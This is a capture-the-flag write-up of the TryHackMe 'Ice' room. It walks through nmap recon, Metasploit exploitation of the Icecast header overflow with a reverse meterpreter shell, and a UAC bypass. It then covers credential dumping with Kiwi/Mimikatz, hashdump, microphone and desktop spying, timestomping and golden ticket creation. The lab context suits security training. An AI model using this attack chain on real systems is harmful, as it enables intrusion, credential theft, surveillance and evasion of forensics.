[ice - TryHackMe](https://tryhackme.com/room/ice) | Cya-nyde
============================================================

Deploy & hack into a Windows machine, exploiting a very poorly secured media server.

- Room created by DarkStar7471
- Room type: Free

## Recon

Recon is performed using nmap with the **-sV** flag to enumerate service versions and **-vv** flag to increase verbosity.

<code>nmap -sV -vv \<ip address></code>

We can see the following ports are open on this machine:

```
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp  open  http         Icecast streaming media server 49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
```

We are also given the following service info:

- Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

### Once the scan completes, we'll see a number of interesting ports open on this machine. As you might have guessed, the firewall has been disabled (with the service completely shutdown), leaving very little to protect this machine. One of the more interesting ports that is open is Microsoft Remote Desktop (MSRDP). What port is this open on?

> MSRDP's default port is **3389**, which is open.

### What service did nmap identify as running on port 8000? (First word of this service)

Our nmap scan returned <code>8000/tcp  open  http         Icecast streaming media server</code> as one of the results

> **Icecast** is the service running on port 8000

### What does Nmap identify as the hostname of the machine? (All caps for the answer)

- <code>Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows</code>
> Hostname is **DARK-PC**

## Gain Access

The room points us to the following link for details regarding the exploit we will be using: [CVE-2004-1561](https://www.cvedetails.com/cve/CVE-2004-1561/)

#### CVE-2004-1561 - Buffer overflow in Icecast 2.0.1 and earlier allows remote attackers to execute arbitrary code via an HTTP request with a large number of headers.

### What is the Impact Score for this vulnerability?

> According to [*cvedetails.com*](https://cvedetails.com), the impact score is **6.4**

### What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000

> The CVE number for this vulnerability is **CVE-2004-1561**

### After Metasploit has started, let's search for our target exploit using the command 'search icecast'. What is the full path (starting with exploit) for the exploitation module?

- We can start the Metasploit console using <code>msfconsole</code>
- Here are the returned results when we search use <code>search icecast</code> after starting *Metasploit*:

<code>0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite</code>

> The full path to the exploit is **exploit/windows/http/icecast_header**

### Following selecting our module, we now have to check what options we have to set. Run the command `show options`. What is the only required setting which currently is blank?

- <code>use 0</code> to select the icecast exploit from search results
- Use <code>show options</code> to show Metasploit module options

The following options get returned for the Icecast module:

```
Module options (exploit/windows/http/icecast_header):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   8000             yes       The target port (TCP)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.29.246.187   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

> **RHOSTS** is the only required option that is blank

- <code>set RHOSTS</code> to target IP
- <code>set LHOSTS</code> to attack machine public IP/Tunnel IP for VPN
- <code>run</code> or <code>exploit</code> to start exploit
    - If exploit is succesful, it should open a meterpreter shell

## Escalate

### Woohoo! We've gained a foothold into our victim machine! What's the name of the shell we have now?

Your shell should look like this: <code>meterpreter</code>

> The name of the shell is **meterpreter**

### What user was running that Icecast process?

> <code>getuid</code> returns us Dark-PC\\**Dark**

### What build of Windows is the system?

> <code>sysinfo</code> returns us <code>OS              : Windows 7 (6.1 Build **7601**, Service Pack 1)</code>

### What is the architecture of the process we're running?

> <code>sysinfo</code> also returned <code>Architecture    : **x64**</code>

### Running the local exploit suggester will return quite a few results for potential escalation exploits. What is the full path (starting with exploit/) for the first returned exploit?

Running post/multi/recon/local_exploit_suggester gives us these results:

```
#   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
 4   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
 5   exploit/windows/local/ms13_053_schlamperei                     Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/ms13_081_track_popup_menu                Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 9   exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.
 10  exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
 11  exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
 ```

 > The full path of the first returned exploit *that includes the term eventvwr* is **exploit/windows/local/bypassuac_eventvwr**

 - *Ctrl + z* to background meterpreter shell
 - <code>use exploit/windows/local/bypassuac_eventvwr</code> will switch us into the bypassuac_eventvwr module
    - Use <code>show options</code> to display options for the module and <code>set SESSION \<session number></code> to select the session you just backgrounded
    - <code>set LHOST</code> to attack machine IP
    - Use <code>run</code> or <code>exploit</code> to start

### We can now verify that we have expanded permissions using the command `getprivs`. What permission listed allows us to take ownership of files?

<code>getprivs</code> returns:

```
Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

> The **SeTakeOwnershipPrivilege** allows us to take ownership of files

## Looting

### In order to interact with lsass we need to be 'living in' a process that is the same architecture as the lsass service (x64 in the case of this machine) and a process that has the same permissions as lsass. The printer spool service happens to meet our needs perfectly for this and it'll restart if we crash it! What's the name of the printer service?

- Using the `ps` command, we can find a process with NT AUTHORITY\SYSTEM
> The room recommends we migrate to **spoolsv.exe** through <code>migrate -N spoolsv.exe</code>

### Let's check what user we are now with the command `getuid`. What user is listed?

> <code>getuid</code> returns **NT AUTHORITY\SYSTEM**

### Which command allows up to retrieve all credentials (in Kiwi)?

- Use <code>load kiwi</code> to load Kiwi (Mimikatz) into our Meterpreter shell to harvest credentials
> Using <code>**creds_all**</code> allows us to retrieve all credentials

### What is Dark's password?

> The user *Dark*'s password is listed as **Password01!**

## Post-Exploitation

### What command allows us to dump all of the password hashes stored on the system? 

> The command `hashdump` allows us to dump all of the password hashes stored on the system

### While more useful when interacting with a machine being used, what command allows us to watch the remote user's desktop in real time?

> The command `screenshare` allows us to watch the remote user's desktop in real time

### How about if we wanted to record from a microphone attached to the system?

> We would use `record_mic`

### To complicate forensics efforts we can modify timestamps of files on the system. What command allows us to do this? Don't ever do this on a pentest unless you're explicitly allowed to do so! This is not beneficial to the defending team as they try to breakdown the events of the pentest after the fact.

> `timestomp` modifies file timestamps

### Mimikatz allows us to create what's called a `golden ticket`, allowing us to authenticate anywhere with ease. What command allows us to do this?

> `golden_ticket_create` allows us to create golden tickets with Mimikatz/Kiwi